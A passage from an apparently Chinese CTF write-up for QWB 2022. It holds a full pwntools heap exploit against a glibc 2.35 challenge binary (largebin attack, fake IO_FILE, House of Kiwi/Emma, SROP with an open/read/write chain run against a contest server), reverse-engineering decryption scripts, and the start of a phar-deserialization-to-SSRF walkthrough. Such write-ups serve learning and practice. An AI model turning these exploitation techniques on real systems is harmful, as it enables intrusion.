<li>进入菜单发现free那里是uaf漏洞，add函数里是只能申请0x418到0x46f大小的堆块，再结合给的libc是2.35版本没有free_hook所以大致攻击就是利用house ofemma，但是edit只有两次的修改的机会，利用两次largebinattack修改stderr伪造假的iofile然后改guard为堆地址。再是修改topchunk，我利用unsortedbin会合并的特点实现了一个堆重叠，从而可以伪造size位再次free之后就能有一个更大的假堆块，再修改topchunk的size触发houseofkiwi再实现houseofemma的调用链。由于开了沙箱，而且read的fd只能为0，发现沙箱有close函数就利用close将0关闭再通过open就能使fd为0然后得到flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">#encoding: utf-8</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import*</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">binary_name = &quot;house_of_cat&quot;</span><br><span class="line">libc_name = &quot;libc-2.35.so&quot;</span><br><span class="line">ld_name = &quot;ld&quot;</span><br><span class="line">local = 1</span><br><span class="line">version = &quot;3&quot;</span><br><span class="line">elf =ELF(&quot;./&quot;+binary_name)</span><br><span class="line">libc = ELF(&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;.format(libc_name,version,libc_name))</span><br><span class="line">#ld = ELF(&quot;./&quot;+ld_name)</span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4, b&#x27;\x00&#x27;))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">info    = lambda tag, addr          :log.info(tag + &quot; -------------&gt; &quot; + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line">if local==1:</span><br><span class="line">	io = remote(&quot;47.93.187.169&quot;,36038)</span><br><span class="line">else:</span><br><span class="line">	io = process(&quot;./&quot;+binary_name)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,&#x27;&#x27;&#x27;</span><br><span class="line">		b _IO_cookie_write</span><br><span class="line"></span><br><span class="line">		&#x27;&#x27;&#x27;)</span><br><span class="line">	pause()</span><br><span class="line">def ROL(content, key):</span><br><span class="line">    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    return int(tmp[key:] + tmp[:key], 2)</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))  #0x418 - 0x46f</span><br><span class="line">	sla(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	sla(&quot;content:\n&quot;,content)</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;4&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	sla(&quot;content:\n&quot;,content)</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def free(idx):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;2&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;3&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;LOGIN |LOGIN r00t QWB QWXFadmin\x00&quot;)</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x78 + p64(0x7ffff7faea60)</span><br><span class="line">add(0,0x420,payload)</span><br><span class="line">add(0xf,0x420,&quot;aaa&quot;)</span><br><span class="line">add(1,0x418,&#x27;cccc&#x27;)</span><br><span class="line">add(0xe,0x418,&quot;ssss&quot;)</span><br><span class="line">free(0)</span><br><span class="line">add(2,0x430,&quot;ddd&quot;)</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;Context:\n&quot;)</span><br><span class="line">libcbase = uu64(io.recv(6)) - 2203856</span><br><span class="line">info(&quot;libcbase&quot;,libcbase)</span><br><span class="line">rc(10)</span><br><span class="line">heap_addr = uu64(io.recv(6))</span><br><span class="line">info(&quot;heap_addr&quot;,heap_addr)</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">stderr_addr = libcbase + libc.sym[&quot;stderr&quot;]</span><br><span class="line">info(&quot;stderr_addr&quot;,stderr_addr)</span><br><span class="line">payload = p64(0)*2 + p64(0)+p64(libcbase-10432-0x20+0x30)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0) + p64(0x71)+p64(0)*13+p64(0x21)</span><br><span class="line">add(3,0x430,payload)</span><br><span class="line">##</span><br><span class="line">pop_rdi_ret = libcbase + 0x000000000002a3e5</span><br><span class="line">pop_rsi_ret = libcbase + 0x000000000002be51</span><br><span class="line">pop_rdx_r12_ret = libcbase + 0x000000000011f497</span><br><span class="line">ret_addr = libcbase  + 0x0000000000029cd6</span><br><span class="line">gadget = libcbase + 0x00000000001675b0 #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br><span class="line">setcontext = libcbase + libc.sym[&quot;setcontext&quot;] + 61 </span><br><span class="line"></span><br><span class="line">info(&quot;setcontext&quot;,setcontext)</span><br><span class="line">_IO_stdfile_2_lock = libcbase + 2210400</span><br><span class="line">info(&quot;_IO_stdfile_2_lock&quot;,_IO_stdfile_2_lock)</span><br><span class="line">## </span><br><span class="line">next_chain = 0</span><br><span class="line">srop_addr = heap_addr + 0x2ae0 + 0x10</span><br><span class="line">fake_IO_FILE = 2 * p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_write_base = 0</span><br><span class="line">fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_base</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_end</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heap_addr) # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase + 2186112 + 0x40)  # vtable</span><br><span class="line">fake_IO_FILE += p64(heap_addr+2400)  # rdi</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget ^ (heap_addr), 0x11))</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">syscall_ret = libcbase + 0x0000000000091396</span><br><span class="line">pop_rax_ret =libcbase + 0x0000000000045eb0</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0x100</span><br><span class="line">frame.rsp = heap_addr +2704</span><br><span class="line">frame.rip = pop_rdi_ret + 1  # : ret</span><br><span class="line">##orw</span><br><span class="line">flag_addr = heap_addr+2688</span><br><span class="line">read_addr = libcbase + libc.sym[&quot;read&quot;]</span><br><span class="line">write_addr = libcbase + libc.sym[&quot;write&quot;] </span><br><span class="line">close_addr =libcbase + libc.sym[&quot;close&quot;]</span><br><span class="line">orw =flat([</span><br><span class="line">	pop_rdi_ret,0,close_addr,</span><br><span class="line">	pop_rdi_ret,flag_addr,</span><br><span class="line">	pop_rax_ret,2,syscall_ret,</span><br><span class="line">    pop_rdi_ret,0,pop_rsi_ret,heap_addr+3232,pop_rdx_r12_ret,0x100,0,read_addr,</span><br><span class="line">	pop_rdi_ret,1,pop_rsi_ret,heap_addr+3232,pop_rdx_r12_ret,0x100,0,pop_rax_ret,1,write_addr</span><br><span class="line">	])</span><br><span class="line">payload = &quot;aaaaaaaa&quot;+p64(0)+p64(heap_addr+2400)+p64(0)*2+p64(setcontext)+str(frame)[0x28:].ljust(0xF8, &#x27;\x00&#x27;)+&#x27;flag&#x27;.ljust(0x10, &#x27;\x00&#x27;) + orw</span><br><span class="line">add(4,0x418,fake_IO_FILE+payload)</span><br><span class="line">free(4)</span><br><span class="line">payload = p64(0)*3+p64(libcbase+libc.sym[&#x27;stderr&#x27;]-0x20)</span><br><span class="line">edit(0,payload)</span><br><span class="line">add(5,0x430,&quot;payload&quot;)</span><br><span class="line">payload = p64(0)*3+p64(0x71)+p64(0)*12+p64(0)+p64(0x21)</span><br><span class="line">add(6,0x430,payload)</span><br><span class="line">free(2)</span><br><span class="line">info(&quot;x&quot;,heap_addr+5344)</span><br><span class="line">free(3)</span><br><span class="line">payload = &quot;\x00&quot;*0x430+p64(0)+p64(0x8a1)</span><br><span class="line">add(7,0x460,payload)</span><br><span class="line">free(3)</span><br><span class="line">info(&quot;top&quot;,heap_addr+7520)</span><br><span class="line">free(6)</span><br><span class="line">add(8,0x430,&quot;aaa&quot;)</span><br><span class="line">payload = &#x27;\x00&#x27;*0x438 + p64(0x80)</span><br><span class="line">add(9,0x440,payload)</span><br><span class="line">#debug()</span><br><span class="line">sla(&quot;choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">sla(&quot;idx:\n&quot;,&#x27;10&#x27;)  </span><br><span class="line">sla(&#x27;size:\n&#x27;,str(0x460))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="flag-值"><a href="#flag-值" class="headerlink" title="flag 值"></a>flag 值</h6><p>flag{e672697f-6e0f-4ebc-aa7f-c941cf974afa}</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="GameMaster"><a href="#GameMaster" class="headerlink" title="GameMaster"></a>GameMaster</h4><p>将exe文件拖入dnSpy进行反编译</p>
<p><img src="https://img-blog.csdnimg.cn/3c62eedab0f94143b23dab3b3415a118.png"></p>
<p>分析代码，先进行异或操作，然后再进行aes解密</p>
<p><img src="https://img-blog.csdnimg.cn/8a451e5d575e472d9493c44b161fea0d.png"></p>
<p><img src="https://img-blog.csdnimg.cn/69b9a5eeb3df48a9a6aa7bc9fc83ac73.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\gx\Downloads\GameMaster\gamemessage&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line">key=<span class="string">b&#x27;qwb2022BlackJack&#x27;</span></span><br><span class="line">iv=<span class="string">b&#x27;Brainstorming!!!&#x27;</span></span><br><span class="line">a=AES.new(iv,mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=a.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(m)</span><br></pre></td></tr></table></figure>



<p>解出来之后foremost，得到一个新的dll</p>
<p><img src="https://img-blog.csdnimg.cn/40df83916a0d44a9b169e93d98173b98.png"></p>
<p>再拖到dnSpy进行反汇编，分析代码</p>
<p><img src="https://s2.loli.net/2022/07/31/5G7onEyjKaiRQWm.png"></p>
<p>写出解密脚本得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Check1</span>(<span class="params">x, y, z, KeyStream</span>):</span></span><br><span class="line">    num = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">        x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        flag = i % <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>):</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        KeyStream[num] = (KeyStream[num] &lt;&lt; <span class="number">1</span>) | ((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> KeyStream</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParseKey</span>(<span class="params">L, Key</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            Key[i * <span class="number">4</span> + j] = L[i] &gt;&gt; j * <span class="number">8</span> &amp; <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> Key</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">first = [<span class="number">101</span>, <span class="number">5</span>, <span class="number">80</span>, <span class="number">213</span>, <span class="number">163</span>, <span class="number">26</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">198</span>, <span class="number">166</span>, <span class="number">140</span>, <span class="number">183</span>, <span class="number">42</span>, <span class="number">247</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">20</span>, <span class="number">145</span>, <span class="number">37</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">7</span>, <span class="number">22</span>, <span class="number">191</span>, <span class="number">110</span>, <span class="number">179</span>, <span class="number">227</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">22</span>, <span class="number">37</span>, <span class="number">5</span>]</span><br><span class="line">KeyStream = [<span class="number">0</span>] * <span class="built_in">len</span>(first)</span><br><span class="line"></span><br><span class="line">x, y, z=BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">    x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    flag = i % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">    KeyStream[num] = ((KeyStream[num] &lt;&lt; <span class="number">1</span>) | ((((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>))))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(first[i]==KeyStream[i])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="comment"># [y = 868387187, x = 156324965, z = 3131229747]</span></span><br><span class="line">y = <span class="number">868387187</span></span><br><span class="line">x = <span class="number">156324965</span></span><br><span class="line">z = <span class="number">3131229747</span></span><br><span class="line">array = [x, y, z]</span><br><span class="line">array2 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">array4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">array5 = [<span class="number">60</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">51</span>, <span class="number">251</span>, <span class="number">167</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">245</span>, <span class="number">207</span>, <span class="number">223</span>, <span class="number">40</span>, <span class="number">103</span>, <span class="number">34</span>, <span class="number">62</span>, <span class="number">22</span>, <span class="number">251</span>, <span class="number">227</span>]</span><br><span class="line">array2 = Check1(array[<span class="number">0</span>], array[<span class="number">1</span>], array[<span class="number">2</span>], array2)</span><br><span class="line">array4 = ParseKey(array, array4)</span><br><span class="line"><span class="built_in">print</span>(array4)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array5)):</span><br><span class="line">    array5[i] ^= array4[i % <span class="built_in">len</span>(array4)]</span><br><span class="line">    array5[i] = <span class="built_in">chr</span>(array5[i])</span><br><span class="line"><span class="built_in">print</span>(array5)</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(array5) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_@re_G3meM3s7er!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h4><p>ctrl+u 发现存在showfile.php任意文件读取</p>
<p><img src="https://img-blog.csdnimg.cn/02f00044045e4660845997c457b8c1b0.png" alt="image-20220801140119319"></p>
<p>不过读取的文件名中必须要有demo或者guest，很简单就能绕过。直接读到了<code>class.php index.php showfile.php upload.php</code></p>
<p>简单看一下，可以发现重点是在<code>class.php</code>，不过在此之前还有一个点，因为所有文件中并没有实现自动打开session，而在showfile.php和upload.php文件中都有限制，必须session存在才能进行文件上传等，就不多说了，可以利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>绕过</p>
<p><code>class.php</code></p>
<p>共有三个类，分别为Upload用于文件上传，GuestShow和AdminShow为在showfile.php中用到，而AdminShow中很明显存在SSRF。而既然有类，当然就会想进行反序列化了，而又存在任意文件读取，就会想到利用<code>phar://</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="keyword">$this</span>-&gt;schema . <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"><span class="variable">$curl</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$response</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">curl_close(<span class="variable">$curl</span>);</span><br><span class="line"><span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.base64_encode(<span class="variable">$response</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>那么来找一下链子吧。首先我们最后想要实现的肯定就是<code>AdminShow#show</code>方法的SSRF，那么可以先找一下有哪个链子能到</p>
<p>这里就直接贴了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GuestShow#__destruct</span><br><span class="line">	GuestShow#__toString</span><br><span class="line">		AdminShow#__get</span><br><span class="line">			AdminShow#show</span><br></pre></td></tr></table></figure>

<p>但是我们可以发现AdminShow类中存在__wakeup给<code>$this-&gt;schema</code>和<code>$this-&gt;source</code>赋值，那么就得重新找一下链子绕过了，这里也不多说，直接贴上吧</p>
